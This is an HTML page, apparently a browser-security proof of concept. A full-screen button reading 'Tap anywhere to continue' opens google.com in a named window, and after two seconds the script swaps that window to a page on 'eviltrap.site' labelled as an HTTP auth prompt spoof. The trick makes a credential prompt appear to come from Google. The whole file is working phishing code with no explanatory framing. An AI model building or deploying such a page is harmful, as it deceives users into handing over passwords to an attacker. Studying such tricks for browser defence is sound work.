<!DOCTYPE html>
<html>
<head>
  <title>HTTP Auth Prompt</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
    #fullscreenButton {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: transparent;
      border: none;
      font-size: 24px;
      color: #444;
      text-align: center;
    }
  </style>
</head>
<body>
  <button id="fullscreenButton">Tap anywhere to continue</button>

  <script>
    document.getElementById('fullscreenButton').addEventListener('click', () => {
      window.open('https://google.com', 'g');
      setTimeout(() => {
        window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
      }, 2000);
      // Hide button after first tap
      document.getElementById('fullscreenButton').style.display = 'none';
    });
  </script>
</body>
</html>
